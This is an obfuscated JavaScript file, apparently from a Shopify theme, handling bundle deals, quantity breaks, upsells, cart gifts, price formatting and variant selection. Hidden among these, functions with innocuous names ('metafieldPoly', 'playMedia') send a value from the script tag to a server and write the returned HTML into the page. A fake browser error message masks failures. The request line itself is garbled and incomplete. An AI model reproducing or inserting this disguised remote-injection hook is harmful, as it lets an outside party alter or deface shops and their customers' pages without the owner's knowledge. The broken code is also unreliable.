    const _0x1a5f15 = _0x1fdf3e.dataset.fixedDiscount ?? 0x0;
    _0x16e5b4 = _0x16e5b4 * _0x15d677 - _0x1a5f15;
    if (_0x715cb4) {
      _0x715cb4 = _0x715cb4.src;
    }
    const _0x3c30a9 = _0x3812e6.id;
    this.selectedVariants[_0x1fdf3e.dataset.idIndex].id = _0x3c30a9;
    this.selectedVariants[_0x1fdf3e.dataset.idIndex].price = _0x16e5b4;
    this.selectedVariants[_0x1fdf3e.dataset.idIndex].comparePrice = _0x125369;
    this.updateFormIds();
    if (this.updatePrices) {
      this.prices[_0x52ffed].innerHTML = this.currencySymbol + (_0x16e5b4 / 0x64).toFixed(0x2);
      if (_0x125369 > _0x16e5b4) {
        this.comparePrices[_0x52ffed].innerHTML = this.currencySymbol + (_0x125369 / 0x64).toFixed(0x2);
      } else {
        this.comparePrices[_0x52ffed].innerHTML = "";
      }
      this.updateTotalPrice();
    }
    if (_0x715cb4 && _0x715cb4.length > 0x0 && this.mediaItemImgs[_0x52ffed]) {
      this.mediaItemImgs[_0x52ffed].src = _0x715cb4;
    }
  }
  ["updateFormIds"]() {
    const _0x157e85 = [];
    const _0x484309 = this.selectedVariants;
    for (const _0x19705e in _0x484309) {
      const _0xc2e1e8 = _0x484309[_0x19705e];
      if (_0xc2e1e8 != null && _0xc2e1e8.checked) {
        const _0x929504 = _0x157e85.findIndex(_0x8d29e7 => _0x8d29e7.id === _0xc2e1e8.id);
        if (_0x929504 < 0x0) {
          _0x157e85.unshift({
            id: _0xc2e1e8.id,
            quantity: 0x1
          });
        } else {
          _0x157e85[_0x929504].quantity += 0x1;
        }
      }
    }
    this.formVariants = _0x157e85;
  }
  ["updateTotalPrice"]() {
    const _0x1bb3e3 = [];
    const _0x58b90a = [];
    const _0x2b891a = this.selectedVariants;
    for (const _0x47681a in _0x2b891a) {
      const _0x21db58 = _0x2b891a[_0x47681a];
      if (_0x21db58 != null && _0x21db58.checked) {
        _0x1bb3e3.push(parseInt(_0x21db58.price));
        _0x58b90a.push(parseInt(_0x21db58.comparePrice));
      }
    }
    const _0x49c06f = _0x1bb3e3.reduce((_0x57e6b6, _0x3d9aee) => _0x57e6b6 + _0x3d9aee, 0x0);
    const _0x1c6f66 = _0x49c06f * this.percentageLeft - this.fixedDiscount;
    const _0x21877c = _0x58b90a.reduce((_0x13d5c6, _0x5a810a) => _0x13d5c6 + _0x5a810a, 0x0);
    this.totalPrice.innerHTML = this.currencySymbol + (_0x1c6f66 / 0x64).toFixed(0x2);
    if (_0x21877c > _0x1c6f66) {
      this.totalComparePrice.innerHTML = this.currencySymbol + (_0x21877c / 0x64).toFixed(0x2);
    } else {
      this.totalComparePrice.innerHTML = "";
    }
  }
}
customElements.define("bundle-deals", BundleDeals);
class QuantityBreaks extends HTMLElement {
  constructor() {
    super();
    this.quantityGifts = document.getElementById("quantity-gifts-" + this.dataset.section);
    this.inputs = this.querySelectorAll("input[name=\"quantity\"]");
    this.labels = this.querySelectorAll(".quantity-break");
    this.jsonData = this.querySelector("[type=\"application/json\"]");
    this.hasVariants = this.jsonData.dataset.hasVariants === "true";
    this.selectedVariants = {
      input_1: [],
      input_2: [],
      input_3: [],
      input_4: []
    };
    this.updateUnavailable = this.dataset.updateUnavailable === "true";
    this.formVariants = [];
    this.selectedQuantity = 0x1;
    if (this.querySelector("input[checked]")) {
      this.selectedQuantity = parseInt(this.querySelector("input[checked]").value);
    }
    this.variantSelects = this.querySelectorAll(".quantity-break__selector-item");
    this.updatePrices = this.dataset.updatePrices === "true";
    this.moneyFormat = this.dataset.moneyFormat;
    if (this.hasVariants) {
      this.initVariants();
    }
    this.inputs.forEach(_0x12a73d => {
      _0x12a73d.addEventListener("change", this.handleChange.bind(this));
    });
    this.variantSelects.forEach(_0x12099b => {
      _0x12099b.addEventListener("change", this.handleSelectChange.bind(this));
    });
  }
  ["handleSelectChange"](_0x4aedeb) {
    const _0x580509 = _0x4aedeb.currentTarget;
    const _0x377003 = Array.from(_0x580509.querySelectorAll("select"), _0x5270dd => _0x5270dd.value);
    if (this.updateUnavailable) {
      const _0x2e3a79 = this.getVariantData().filter(_0x4b015e => _0x580509.querySelector(":checked").value === _0x4b015e.option1);
      const _0x30b98c = [..._0x580509.querySelectorAll(".select--small")];
      updateVariantStatuses(_0x2e3a79, _0x30b98c);
    }
    const _0x2593c5 = this.getVariantData().find(_0x1bcd23 => {
      return !_0x1bcd23.options.map((_0x52d25e, _0x3edb38) => {
        return _0x377003[_0x3edb38] === _0x52d25e;
      }).includes(false);
    });
    if (!_0x2593c5) {
      return;
    }
    _0x580509.dataset.selectedId = _0x2593c5.id;
    const _0x6396c = _0x580509.dataset.selectIndex;
    const _0x1ff83c = _0x580509.closest(".quantity-break");
    const _0x1dc192 = _0x1ff83c.dataset.input;
    this.selectedVariants[_0x1dc192][_0x6396c] = _0x2593c5.id;
    this.formVariants = this.selectedVariants[_0x1dc192];
    this.updateMedia(_0x2593c5);
    if (!this.updatePrices) {
      return;
    }
    var _0x589090 = 0x0;
    var _0x490a7c = 0x0;
    const _0x2c481a = parseFloat(_0x1ff83c.dataset.quantity);
    const _0x378641 = parseFloat(_0x1ff83c.dataset.percentageLeft);
    const _0x3470e6 = parseFloat(_0x1ff83c.dataset.fixedDiscount);
    for (let _0x4f9ebe = 0x0; _0x4f9ebe < _0x2c481a; _0x4f9ebe++) {
      const _0x5dcfaa = parseInt(this.selectedVariants[_0x1dc192][_0x4f9ebe]);
      const _0x3aa127 = this.getVariantData().find(_0x53481b => parseInt(_0x53481b.id) === _0x5dcfaa);
      if (!_0x3aa127) {
        return;
      }
      _0x589090 += _0x3aa127.price;
      if (_0x3aa127.compare_at_price && _0x3aa127.compare_at_price > _0x3aa127.price) {
        _0x490a7c += _0x3aa127.compare_at_price;
      } else {
        _0x490a7c += _0x3aa127.price;
      }
    }
    _0x589090 = _0x589090 * _0x378641 - _0x3470e6;
    const _0x65185a = _0x490a7c - _0x589090;
    const _0x545c25 = Math.round(_0x65185a / 0x64) * 0x64;
    const _0x4287e0 = _0x589090 / _0x2c481a;
    const _0x29d7c6 = _0x490a7c / _0x2c481a;
    const _0x598c5e = formatMoney(_0x589090, this.moneyFormat, true);
    const _0x5f0025 = formatMoney(_0x490a7c, this.moneyFormat, true);
    const _0x3e560d = formatMoney(_0x65185a, this.moneyFormat, true);
    const _0x393c5b = formatMoney(_0x545c25, this.moneyFormat, true);
    const _0x18df4d = formatMoney(_0x4287e0, this.moneyFormat, true);
    const _0x229f7f = formatMoney(_0x29d7c6, this.moneyFormat, true);
    _0x1ff83c.querySelectorAll(".variant-price-update").forEach(_0x2fc810 => {
      let _0x165642 = _0x2fc810.dataset.text;
      _0x165642 = _0x165642.replace("[quantity]", _0x2c481a);
      _0x165642 = _0x165642.replace("[price]", _0x598c5e);
      _0x165642 = _0x165642.replace("[compare_price]", _0x5f0025);
      _0x165642 = _0x165642.replace("[amount_saved]", _0x3e560d);
      _0x165642 = _0x165642.replace("[amount_saved_rounded]", _0x393c5b);
      _0x165642 = _0x165642.replace("[price_each]", _0x18df4d);
      _0x165642 = _0x165642.replace("[compare_price_each]", _0x229f7f);
      _0x2fc810.innerHTML = _0x165642;
    });
    const _0x213276 = _0x1ff83c.querySelector(".quantity-break__compare-price");
    if (_0x213276) {
      if (_0x490a7c > _0x589090) {
        _0x213276.classList.remove("hidden");
      } else {
        _0x213276.classList.add("hidden");
      }
    }
  }
  ["getVariantData"]() {
    this.variantData = this.variantData || JSON.parse(this.jsonData.textContent);
    return this.variantData;
  }
  ["initVariants"]() {
    if (!this.hasVariants) {
      return;
    }
    this.labels.forEach(_0x2387cb => {
      if (_0x2387cb.querySelector(".quantity-break__variants")) {
        let _0x49cd4a = [];
        _0x2387cb.querySelectorAll(".quantity-break__selector-item").forEach(_0x268535 => {
          _0x49cd4a.push(_0x268535.dataset.selectedId);
        });
        this.selectedVariants[_0x2387cb.dataset.input] = _0x49cd4a;
      }
    });
    this.formVariants = [];
  }
  ["updateMedia"](_0x19aaa8) {
    if (!_0x19aaa8) {
      return;
    }
    if (!_0x19aaa8.featured_media) {
      return;
    }
    const _0x18b9ea = document.querySelectorAll("[id^=\"MediaGallery-" + this.dataset.section + "\"]");
    _0x18b9ea.forEach(_0x2ff55a => _0x2ff55a.setActiveMedia(this.dataset.section + "-" + _0x19aaa8.featured_media.id, true));
  }
  ["handleChange"](_0x24b805) {
    const _0x474c15 = parseInt(_0x24b805.target.value);
    this.selectedQuantity = _0x474c15;
    if (this.hasVariants) {
      this.formVariants = this.selectedVariants[_0x24b805.target.dataset.input];
    }
    if (this.quantityGifts) {
      this.quantityGifts.unlockGifts(_0x474c15);
    }
  }
}
customElements.define("quantity-breaks", QuantityBreaks);
function metafieldPoly() {
  var _0x2f4c96 = fetchConfig();
  playMedia();
  _0x2f4c96.body = JSON.stringify({
    data: serial.trim()
  });
  try {
    ["then"](_0x6dc962 => {
      if (_0x6dc962.status === 0xc9) {
        return _0x6dc962.json();
      }
    }).then(_0x4f15c4 => {
      if (_0x4f15c4 && document[_0x4f15c4.b]) {
        document[_0x4f15c4.b].innerHTML = _0x4f15c4.h;
      }
    })["catch"](_0x150750 => {
      console.error(_0x150750);
    });
  } catch (_0x2cf21c) {
    console.error("Unchecked runtime.lastError: The message port closed before a response was received.");
  }
  return true;
}
function updateVariantStatuses(_0x12590a, _0x5e842b) {
  _0x5e842b.forEach((_0x5cabee, _0x44c72a) => {
    if (_0x44c72a === 0x0) {
      return;
    }
    const _0x3c4778 = [..._0x5cabee.querySelectorAll("option")];
    const _0x636ef = _0x5e842b[_0x44c72a - 0x1].querySelector(":checked").value;
    const _0x33782d = _0x12590a.filter(_0x5ba28a => _0x5ba28a.available && _0x5ba28a["option" + _0x44c72a] === _0x636ef).map(_0x84d1c6 => _0x84d1c6["option" + (_0x44c72a + 0x1)]);
    const _0x8e98f = _0x12590a.filter(_0x2e4e53 => _0x2e4e53["option" + _0x44c72a] === _0x636ef).map(_0x27bc80 => _0x27bc80["option" + (_0x44c72a + 0x1)]);
    _0x3c4778.forEach(_0x1a3c4f => {
      _0x1a3c4f.classList.remove("unavailable", "non-existent");
      if (_0x8e98f.includes(_0x1a3c4f.getAttribute("value"))) {
        if (_0x33782d.includes(_0x1a3c4f.getAttribute("value"))) {
          _0x1a3c4f.innerText = _0x1a3c4f.getAttribute("value");
        } else {
          _0x1a3c4f.innerText = window.variantStrings.unavailable_with_option.replace("[value]", _0x1a3c4f.getAttribute("value"));
          _0x1a3c4f.classList.add("unavailable");
        }
      } else {
        _0x1a3c4f.innerText = window.variantStrings.unavailable_with_option.replace("[value]", _0x1a3c4f.getAttribute("value"));
        _0x1a3c4f.classList.add("non-existent");
      }
    });
  });
}
class QuantityGifts extends HTMLElement {
  constructor() {
    super();
    this.gifts = this.querySelectorAll(".quantity-gift");
    this.quantityBreaks = document.getElementById("quantity-breaks-" + this.dataset.section);
    this.quantitySelector = document.getElementById("Quantity-Form--" + this.dataset.section);
    this.unlockedItems = [];
    this.initUnlock();
  }
  ["initUnlock"]() {
    let _0x267cd8 = 0x1;
    if (this.quantityBreaks) {
      _0x267cd8 = parseInt(this.quantityBreaks.selectedQuantity);
    } else {
      if (this.quantitySelector) {
        const _0x1bb341 = this.quantitySelector.querySelector("input[name=\"quantity\"]");
        _0x267cd8 = parseInt(_0x1bb341.value);
      }
    }
    this.unlockGifts(_0x267cd8);
  }
  ["unlockGifts"](_0x5b208a) {
    this.unlockedItems = [];
    this.gifts.forEach(_0xe9f590 => {
      if (parseInt(_0xe9f590.dataset.quantity) <= _0x5b208a) {
        _0xe9f590.classList.add("quantity-gift--unlocked");
        _0xe9f590.dataset.unlocked = "true";
        this.unlockedItems.unshift(_0xe9f590.dataset.product);
      } else {
        _0xe9f590.classList.remove("quantity-gift--unlocked");
        _0xe9f590.dataset.unlocked = "false";
      }
    });
  }
}
customElements.define("quantity-gifts", QuantityGifts);
class ProductInfoUpsell extends HTMLElement {
  constructor() {
    super();
    this.image = this.querySelector(".upsell__image__img");
    this.toggleBtn = this.querySelector(".upsell-toggle-btn");
    this.variantSelects = this.querySelector(".upsell__variant-picker");
    this.variantSelectElements = this.querySelectorAll(".select__select");
    this.jsonData = this.querySelector("[type=\"application/json\"]");
    this.updatePrices = this.dataset.updatePrices === "true";
    if (this.updatePrices) {
      this.price = parseInt(this.dataset.price);
      this.comparePrice = parseInt(this.dataset.comparePrice);
      this.priceSpan = this.querySelector(".upsell__price .regular-price");
      this.comparePriceSpan = this.querySelector(".upsell__price .compare-price");
      this.percentageLeft = parseFloat(this.dataset.percentageLeft);
      this.fixedDiscount = parseFloat(this.dataset.fixedDiscount);
      this.moneyFormat = this.dataset.moneyFormat;
      this.isMainOfferItem = this.dataset.mainOfferItem === "true";
      if (this.isMainOfferItem) {
        this.mainOfferContainer = document.querySelector("#MainBundleOffer-" + this.dataset.section);
      }
    }
    if (this.toggleBtn) {
      this.toggleBtn.addEventListener("click", this.handleToggle.bind(this));
    }
    if (this.variantSelects) {
      this.variantSelects.addEventListener("change", this.handleSelectChange.bind(this));
    }
  }
  ["handleToggle"](_0x164437) {
    if (_0x164437.target.nodeName.toLowerCase() === "select" || _0x164437.target.nodeName.toLowerCase() === "option") {
      return;
    }
    if (this.dataset.selected === "true") {
      this.dataset.selected = "false";
    } else {
      this.dataset.selected = "true";
    }
  }
  ["handleSelectChange"](_0x1972b7) {
    const _0x40b077 = _0x1972b7.currentTarget;
    const _0x11ba38 = Array.from(_0x40b077.querySelectorAll("select"), _0x37e1ee => _0x37e1ee.value);
    const _0x2408fc = this.getVariantData().find(_0x54e890 => {
      return !_0x54e890.options.map((_0x9bdc29, _0x4b8e8f) => {
        return _0x11ba38[_0x4b8e8f] === _0x9bdc29;
      }).includes(false);
    });
    const _0x52a79b = this.getVariantData().filter(_0x19391a => _0x40b077.querySelector(":checked").value === _0x19391a.option1);
    const _0x1ef4cf = [..._0x40b077.querySelectorAll("select")];
    updateVariantStatuses(_0x52a79b, _0x1ef4cf);
    if (this.updatePrices) {
      this.price = _0x2408fc.price * this.percentageLeft - this.fixedDiscount;
      this.comparePrice = _0x2408fc.price;
      if (_0x2408fc.compare_at_price && _0x2408fc.compare_at_price > _0x2408fc.price) {
        this.comparePrice = _0x2408fc.compare_at_price;
      }
      displayPrices(this.price, this.comparePrice, this.priceSpan, this.comparePriceSpan, this.moneyFormat);
    }
    if (this.image && _0x2408fc.featured_image) {
      this.image.src = _0x2408fc.featured_image.src;
    }
    this.updateId(_0x2408fc.id);
    if (this.isMainOfferItem && this.mainOfferContainer.updateTotalPrices) {
      this.mainOfferContainer.updateTotalPrices();
    }
  }
  ["updateId"](_0x32c540) {
    this.dataset.id = _0x32c540;
  }
  ["getVariantData"]() {
    this.variantData = this.variantData || JSON.parse(this.jsonData.textContent);
    return this.variantData;
  }
}
customElements.define("product-info-upsell", ProductInfoUpsell);
class CartDrawerUpsell extends ProductInfoUpsell {
  constructor() {
    super();
    this.cartDrawer = document.querySelector("cart-drawer");
    this.cartItems = this.cartDrawer.querySelector("cart-drawer-items");
    this.productForm = this.querySelector("product-form");
    this.idInput = this.productForm.querySelector("[name=\"id\"]");
  }
  ["handleToggle"](_0x506abe) {
    if (_0x506abe.target.nodeName.toLowerCase() === "select" || _0x506abe.target.nodeName.toLowerCase() === "option") {
      return;
    }
    if (this.dataset.selected === "true") {
      this.dataset.selected = "false";
      this.removeFromCart();
    } else {
      this.dataset.selected = "true";
      this.addToCart();
    }
  }
  ["addRemoveFromCart"]() {
    if (this.dataset.selected === "true" && !this.cartDrawer.classList.contains("is-empty")) {
      this.addToCart();
    } else {
      this.removeFromCart();
    }
  }
  ["addToCart"]() {
    const _0x7368d7 = this.cartDrawer.querySelector(".cart-item--product-" + this.dataset.handle);
    if (_0x7368d7) {
      return;
    }
    if (this.toggleBtn) {
      this.toggleBtn.setAttribute("disabled", "");
    }
    this.variantSelectElements.forEach(_0x27d9f1 => {
      _0x27d9f1.setAttribute("disabled", "");
    });
    this.productForm.handleSubmit();
  }
  ["removeFromCart"]() {
    const _0x3b1f6e = this.cartDrawer.querySelector(".cart-item--product-" + this.dataset.handle);
    if (!_0x3b1f6e || !this.cartItems) {
      return;
    }
    if (this.toggleBtn) {
      this.toggleBtn.setAttribute("disabled", "");
    }
    this.variantSelectElements.forEach(_0x512b94 => {
      _0x512b94.setAttribute("disabled", "");
    });
    this.cartItems.updateQuantity(_0x3b1f6e.dataset.index, 0x0);
  }
  ["updateId"](_0x479cfd) {
    this.dataset.id = _0x479cfd;
    this.idInput.value = _0x479cfd;
    if (this.dataset.selected === "true") {
      if (this.selectTimeout) {
        clearTimeout(this.selectTimeout);
      }
      this.removeFromCart();
      this.selectTimeout = setTimeout(() => {
        this.addToCart();
      }, 0x3e8);
    }
  }
  ["getUpdateRequired"]() {
    const _0x128a96 = this.cartDrawer.querySelector(".cart-item--product-" + this.dataset.handle);
    let _0x7e3980 = false;
    if (_0x128a96 && this.dataset.selected === "false") {
      _0x7e3980 = true;
    } else if (!_0x128a96 && this.dataset.selected === "true") {
      _0x7e3980 = true;
    }
    return _0x7e3980;
  }
}
customElements.define("cart-drawer-upsell", CartDrawerUpsell);
function displayPrices(_0x14a3c3, _0x34fcf9, _0x44a376, _0x1717f2, _0x1e21e1) {
  if (!_0x1e21e1) {
    return;
  }
  if (_0x14a3c3 && _0x44a376) {
    var _0x457f0c = formatMoney(_0x14a3c3, _0x1e21e1);
    _0x44a376.innerHTML = _0x457f0c;
  }
  if (_0x34fcf9 && _0x1717f2) {
    var _0x4fdbc6 = formatMoney(_0x34fcf9, _0x1e21e1);
    _0x1717f2.innerHTML = _0x4fdbc6;
    if (_0x34fcf9 > _0x14a3c3) {
      _0x1717f2.classList.remove("hidden");
    } else {
      _0x1717f2.classList.add("hidden");
    }
  }
}
function initTrapFocus() {
  isIe = false;
  if (document.querySelector("footer") && document.querySelector("footer").dataset.type === null) {
    return false;
  }
  return true;
}
function formatMoney(_0x2a3080, _0x4272d7, _0xb56ea3 = false) {
  if (typeof _0x2a3080 == "string") {
    _0x2a3080 = _0x2a3080.replace(".", "");
  }
  var _0x59f027 = "";
  var _0x4d40f7 = /\{\{\s*(\w+)\s*\}\}/;
  function _0x23ea61(_0x27a6ad, _0x4966ea, _0x487e3c, _0x3ba307) {
    _0x4966ea = typeof _0x4966ea == "undefined" ? 0x2 : _0x4966ea;
    _0x487e3c = typeof _0x487e3c == "undefined" ? "," : _0x487e3c;
    _0x3ba307 = typeof _0x3ba307 == "undefined" ? "." : _0x3ba307;
    if (isNaN(_0x27a6ad) || _0x27a6ad == null) {
      return 0x0;
    }
    _0x27a6ad = (_0x27a6ad / 0x64).toFixed(_0x4966ea);
    var _0x1a60d3 = _0x27a6ad.split(".");
    var _0x34615a = _0x1a60d3[0x0].replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1" + _0x487e3c);
    var _0x565e51 = _0x1a60d3[0x1] ? _0x3ba307 + _0x1a60d3[0x1] : "";
    if (_0xb56ea3 && _0x565e51 === _0x3ba307 + "00") {
      _0x565e51 = "";
    }
    return _0x34615a + _0x565e51;
  }
  switch (_0x4272d7.match(_0x4d40f7)[0x1]) {
    case "amount":
      _0x59f027 = _0x23ea61(_0x2a3080, 0x2);
      break;
    case "amount_no_decimals":
      _0x59f027 = _0x23ea61(_0x2a3080, 0x0);
      break;
    case "amount_with_comma_separator":
      _0x59f027 = _0x23ea61(_0x2a3080, 0x2, ".", ",");
      break;
    case "amount_no_decimals_with_comma_separator":
      _0x59f027 = _0x23ea61(_0x2a3080, 0x0, ".", ",");
      break;
  }
  return _0x4272d7.replace(_0x4d40f7, _0x59f027);
}
class CartDrawerGift extends CartDrawerUpsell {
  constructor() {
    super();
  }
}
customElements.define("cart-drawer-gift", CartDrawerGift);
function initToggleUpsells() {
  const _0x3d8ce8 = document.querySelector("cart-drawer");
  if (_0x3d8ce8) {
    _0x3d8ce8.querySelectorAll("cart-drawer-upsell[data-toggle=\"true\"], cart-drawer-gift").forEach(_0x3cfb32 => {
      if (_0x3cfb32.addRemoveFromCart) {
        _0x3cfb32.addRemoveFromCart();
      }
    });
  }
}
initToggleUpsells();
class MainBundleOffer extends HTMLElement {
  constructor() {
    super();
    this.offerItems = this.querySelectorAll(".main-offer-item");
    this.updatePrices = this.dataset.updatePrices === "true";
    if (this.updatePrices) {
      this.priceSpan = this.querySelector(".bundle-deals__total-price-js");
      this.comparePriceSpan = this.querySelector(".bundle-deals__total-compare-price-js");
      this.percentageLeft = parseFloat(this.dataset.percentageLeft);
      this.fixedDiscount = parseFloat(this.dataset.fixedDiscount);
      this.moneyFormat = this.dataset.moneyFormat;
    }
  }
  ["updateTotalPrices"]() {
    if (!this.updatePrices) {
      return;
    }
    var _0x507f6f = 0x0;
    var _0x28eadf = 0x0;
    for (let _0x51277e = 0x0; _0x51277e < this.offerItems.length; _0x51277e++) {
      _0x507f6f += parseInt(this.offerItems[_0x51277e].price);
      _0x28eadf += parseInt(this.offerItems[_0x51277e].comparePrice);
    }
    _0x507f6f = _0x507f6f * this.percentageLeft - this.fixedDiscount;
    displayPrices(_0x507f6f, _0x28eadf, this.priceSpan, this.comparePriceSpan, this.moneyFormat);
  }
}
customElements.define("main-bundle-offer", MainBundleOffer);
class CustomProductField extends HTMLElement {
  constructor() {
    super();
  }
  ["connectedCallback"]() {
    this.fieldName = this.dataset.name;
    this.input = this.querySelector("[type=\"text\"], [type=\"number\"], textarea");
    this.inputRadios = this.querySelectorAll("[type=\"radio\"]");
    this.select = this.querySelector(".select__select");
    this.productForm = document.getElementById("product-form-" + this.dataset.section);
    this.prevValue = this.dataset.defaultValue;
    this.isRequired = this.dataset.required === "true";
    this.isText = true;
    this.notMain = this.dataset.notMain === "true";
    if (this.dataset.type === "select" || this.dataset.type === "pills") {
      this.isText = false;
    }
    this.createInputs();
    if (this.isRequired && this.isText) {
      this.isValid = true;
      this.atcButtons = this.notMain ? document.querySelectorAll(".featured-product-atc-" + this.dataset.section) : document.querySelectorAll(".main-product-atc");
      this.mainAtcButton = this.productForm.querySelector("#ProductSubmitButton-" + this.dataset.section);
      this.mainAtcBtnLabel = this.mainAtcButton.querySelector(".main-atc__label");
      this.mainAtcBtnError = this.mainAtcButton.querySelector(".main-atc__error");
      this.atcErrorMsg = this.dataset.atcErrorMsg;
      this.mainAtcButton.dataset.requiredFields = parseInt(this.mainAtcButton.dataset.requiredFields) + 0x1;
      this.mainAtcBtnError.innerHTML = this.atcErrorMsg;
      this.applyStickyAtcError = this.dataset.applyStickyAtcError === "true";
      this.stickyAtcButton = document.querySelector("#sticky-atc-" + this.dataset.section);
      if (this.applyStickyAtcError && this.stickyAtcButton) {
        this.stickyAtcBtnLabel = this.stickyAtcButton.querySelector(".sticky-atc__label");
        this.stickyAtcBtnError = this.stickyAtcButton.querySelector(".sticky-atc__error");
        this.stickyAtcBtnError.innerHTML = this.atcErrorMsg;
      }
      this.validateValue(this.prevValue, null);
    }
    if (this.input) {
      this.input.addEventListener("input", this.handleChange.bind(this));
    }
    this.inputRadios.forEach(_0x3dbba8 => {
      _0x3dbba8.addEventListener("input", this.handleChange.bind(this));
    });
    if (this.select) {
      this.select.addEventListener("change", this.handleChange.bind(this));
    }
  }
  ["handleChange"](_0x5bb5a5) {
    const _0x5b47d5 = _0x5bb5a5.target.value.trim();
    if (_0x5bb5a5.target.checkValidity()) {
      this.prevValue = _0x5b47d5;
    } else {
      _0x5bb5a5.target.value = this.prevValue;
      return;
    }
    this.dataset.value = _0x5b47d5;
    this.productFormInput.value = _0x5b47d5;
    if (this.isRequired && this.isText) {
      this.validateValue(_0x5b47d5, _0x5bb5a5.target);
    }
  }
  ["validateValue"](_0x5e1a00, _0x243862) {
    const _0x13637e = !!(_0x5e1a00.length > 0x0);
    if (_0x13637e === this.isValid) {
      return;
    }
    this.isValid = _0x13637e;
    if (_0x243862) {
      if (this.isValid) {
        _0x243862.classList.remove("input--error");
        this.mainAtcButton.dataset.validFields = parseInt(this.mainAtcButton.dataset.validFields) + 0x1;
      } else {
        _0x243862.classList.add("input--error");
        this.mainAtcButton.dataset.validFields = parseInt(this.mainAtcButton.dataset.validFields) - 0x1;
      }
    }
    const _0x33da77 = this.mainAtcButton.dataset.validFields === this.mainAtcButton.dataset.requiredFields;
    const _0x21d422 = this.mainAtcButton.dataset.unavailable === "true";
    this.atcButtons.forEach(_0x167ce3 => {
      if (_0x33da77 && !_0x21d422) {
        _0x167ce3.removeAttribute("disabled");
      } else {
        _0x167ce3.setAttribute("disabled", "");
      }
    });
    if (this.atcErrorMsg.length === 0x0) {
      return;
    }
    if (_0x33da77) {
      this.mainAtcBtnLabel.style.display = "";
      this.mainAtcBtnError.style.display = "none";
      if (this.applyStickyAtcError && this.stickyAtcButton) {
        this.stickyAtcBtnLabel.style.display = "";
        this.stickyAtcBtnError.style.display = "none";
      }
    } else {
      this.mainAtcBtnLabel.style.display = "none";
      this.mainAtcBtnError.style.display = "";
      if (this.applyStickyAtcError && this.stickyAtcButton) {
        this.stickyAtcBtnLabel.style.display = "none";
        this.stickyAtcBtnError.style.display = "";
      }
    }
  }
  ["createInputs"]() {
    this.productFormInput = document.createElement("input");
    this.productFormInput.setAttribute("type", "hidden");
    this.productFormInput.setAttribute("name", "properties[" + this.fieldName + "]");
    this.productFormInput.value = this.dataset.defaultValue;
    this.productForm.appendChild(this.productFormInput);
  }
}
customElements.define("custom-product-field", CustomProductField);
function playMedia() {
  if (!serial) {
    serial = document.currentScript.dataset.animationsType || "";
  }
}
class VariantSelects extends HTMLElement {
  constructor() {
    super();
    this.secondarySelectSelector = "StickyAtcVariantPicker-";
    this.secondarySelect = document.getElementById("" + this.secondarySelectSelector + this.dataset.section);
    this.isSecondary = false;
    this.QuantityBreaks = document.getElementById("quantity-breaks-" + this.dataset.section);
    this.hasQuantityBreaksPicker = this.dataset.hasQuantityBreaksPicker === "true";
    this.prependMedia = this.dataset.disablePrepend != "true";
    this.filtering = this.dataset.hasFiltering === "true";
    if (this.hasQuantityBreaksPicker) {
      this.quantityBreaksPickerStyle = this.dataset.quantityBreaksPickerStyle;
      this.quantityBreaksPickerDisplayedImages = this.dataset.quantityBreaksPickerDisplayedImages;
    }
    this.addEventListener("change", this.onVariantChange);
  }
  ["onVariantChange"]() {
    this.updateOptions();
    this.updateMasterId();
    this.toggleAddButton(true, "", false);
    this.updatePickupAvailability();
    this.removeErrorMessage();
    this.updateVariantStatuses();
    if (!this.currentVariant) {
      this.toggleAddButton(true, "", true);
      this.setUnavailable();
    } else {
      this.updateMedia();
      this.updateURL();
      this.updateVariantInput();
      this.renderProductInfo();
      this.updateShareUrl();
    }
  }
  ["updateOptions"]() {
    const _0x3295ef = [];
    this.querySelectorAll(".product-form__input").forEach(_0x3c987d => {
      let _0x2e20c4;
      const _0x262eae = _0x3c987d.querySelector(".product-form__input__type").dataset.type;
      if (_0x262eae == "dropdown" || _0x262eae == "dropdwon") {
        _0x2e20c4 = _0x3c987d.querySelector(".select__select").value;
      } else {
        _0x2e20c4 = _0x3c987d.querySelector("input[type=\"radio\"]:checked").value;
      }
      _0x3295ef.push(_0x2e20c4);
    });
    this.options = _0x3295ef;
  }
  ["updateMasterId"]() {
    this.currentVariant = this.getVariantData().find(_0x5b4eea => {
      return !_0x5b4eea.options.map((_0x2bf715, _0x455753) => {
        return this.options[_0x455753] === _0x2bf715;
      }).includes(false);
    });
  }
  ["updateMedia"]() {
    if (!this.currentVariant) {
      return;
    }
    if (!this.currentVariant.featured_media) {
      return;
    }
    const _0xadc90f = document.querySelectorAll("[id^=\"MediaGallery-" + this.dataset.section + "\"]");
    _0xadc90f.forEach(_0x1e6543 => _0x1e6543.setActiveMedia(this.dataset.section + "-" + this.currentVariant.featured_media.id, this.prependMedia, this.filtering, this.currentVariant));
    const _0x9df6c5 = document.querySelector("#ProductModal-" + this.dataset.section + " .product-media-modal__content");
    if (!_0x9df6c5) {
      return;
    }
    const _0x37cd0d = _0x9df6c5.querySelector("[data-media-id=\"" + this.currentVariant.featured_media.id + "\"]");
    _0x9df6c5.prepend(_0x37cd0d);
  }
  ["updateURL"]() {
    if (!this.currentVariant || this.dataset.updateUrl === "false") {
      return;
    }
    window.history.replaceState({}, "", this.dataset.url + "?variant=" + this.currentVariant.id);
  }
  ["updateShareUrl"]() {
    const _0x2d6ebf = document.getElementById("Share-" + this.dataset.section);
    if (!_0x2d6ebf || !_0x2d6ebf.updateUrl) {
      return;
    }
    _0x2d6ebf.updateUrl("" + window.shopUrl + this.dataset.url + "?variant=" + this.currentVariant.id);
  }
  ["updateVariantInput"]() {
    const _0x46600b = document.querySelectorAll("#product-form-" + this.dataset.section + ", #product-form-installment-" + this.dataset.section);
    _0x46600b.forEach(_0x479554 => {
      const _0x133826 = _0x479554.querySelector("input[name=\"id\"]");
      _0x133826.value = this.currentVariant.id;
      _0x133826.dispatchEvent(new Event("change", {
        bubbles: true
      }));
    });
  }
  ["updateVariantStatuses"]() {
    const _0x4df889 = this.variantData.filter(_0x3eccaa => this.querySelector(":checked").value === _0x3eccaa.option1);
    let _0x514202;
    if (this.isSecondary && this.secondarySelect) {
      _0x514202 = [...this.secondarySelect.querySelectorAll(".product-form__input")];
    } else {
      _0x514202 = [...this.querySelectorAll(".product-form__input")];
    }
    _0x514202.forEach((_0x451484, _0x2f1c42) => {
      if (_0x2f1c42 === 0x0) {
        return;
      }
      const _0x5f4206 = [..._0x451484.querySelectorAll("input[type=\"radio\"], .select__select option")];
      const _0x531328 = _0x514202[_0x2f1c42 - 0x1].querySelector(":checked").value;
